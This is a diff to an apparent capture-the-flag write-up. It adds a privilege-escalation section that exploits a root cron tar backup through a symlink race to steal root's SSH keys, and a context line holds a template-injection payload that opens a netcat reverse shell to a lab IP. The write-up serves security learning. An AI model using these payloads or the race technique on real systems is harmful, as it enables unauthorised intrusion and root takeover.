@@ -156,7 +156,45 @@ by setting `costume=glasses</p><h1>INJECTION</h1>`.
 `costume={{ ''.__class__.__mro__[1].__subclasses__()[389]("rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.29+8082+>/tmp/f",shell=True,stdout=-1).communicate() }}`
 ![Screenshot from 2022-02-09 00-02-53](https://user-images.githubusercontent.com/79413473/153052905-2c369163-7602-4e86-8a60-79674fc5fd89.png)
 
+## Privilege Escaltion: Abusing tar symlink feature
 
++ After upgrading to a proper tty shell. We can enumerate a little bit & running [pspy](https://github.com/DominicBreuker/pspy) gives that there is a task running by root(uid=0) every minute
+![Screenshot from 2022-02-09 00-14-05](https://user-images.githubusercontent.com/79413473/153054599-5f50ad56-172b-4399-ae36-59a42b7d21df.png)
++ First i always place my ssh keys on machine for some reason my tty shell is sometime so laggy and bascically disgusting (not simple nc shell only tty shells).
++ putting my public key as authorized keys on machine and i can ssh.
+![Screenshot from 2022-02-09 00-19-01](https://user-images.githubusercontent.com/79413473/153055344-24ff5eb9-fe3c-495d-9cf8-966944dc1881.png)
+
++ Let's read content of cron script **/usr/bin/backup.sh**
+```
+#!/bin/bash
+file=`date +%N`
+/usr/bin/rm -rf /opt/backups/*
+/usr/bin/tar -cvf "/opt/backups/$file.tar" /var/www/app/
+sha1sum "/opt/backups/$file.tar" | cut -d ' ' -f1 > /opt/backups/checksum
+sleep 5
+check_file=`date +%N`
+/usr/bin/tar -chvf "/var/backups/web_backups/${check_file}.tar" /opt/backups/checksum "/opt/backups/$file.tar"
+/usr/bin/rm -rf /opt/backups/*
+```  
++ It creates tar archive of */var/www/app* and place it in */opt/backups* create a sha1 hash put in backups and then sleep for 5 seconds then make tar archive of both files and place it in */var/backups/web_backups* then remove evrything from */opt/backups*
++ Interesting to note here is that we have full write access on */opt/backups* directory and seconf tar archiving follow symlinks also(-h flag). symlinks are files which basically points to other files on system.
++ Now what we can do is that in 5 second window we can replace checksum file with our symlink to /root directory or any root file e.g. */root/.ssh*. We can't relace tar file as it has a unique name cretaed by date command and we can't guess that. we can work something out to get same name but replacing checksum is easier. Obviously running evrything is impossile so this bash script wil do the work.
+```
+#!/bin/bash
+
+cd /opt/backups
+rm -f checksum
+ln -s /root ./checksum
+exit
+```
++ changing directory, remove current checksum file withoout any prompt `-f` then create a symlink to /root with same  file name then exit happily.
++ You can continously run this script or moment you see a tar archive in */opt/backups* run this script obviously you will need two different panes for that.
++ Download the latest tar archive from */var/backups/web_backups* or with slight large file size. In my case it was 77MB as it was whole */root* directory you 
+  can point it to */root/.ssh*(will be of same size in this case) and save your time.
++ Download the newly created tar or just extract it there on machine and you will have your root keys
+![Screenshot from 2022-02-09 00-39-06](https://user-images.githubusercontent.com/79413473/153058328-152fdd24-a738-4166-83b0-ec2405f7bc1b.png)
++ Login as root
+ ![Screenshot from 2022-02-09 00-40-13](https://user-images.githubusercontent.com/79413473/153058452-e1974156-70e3-47e5-a7d3-9981a5657c5b.png)
 
 
 
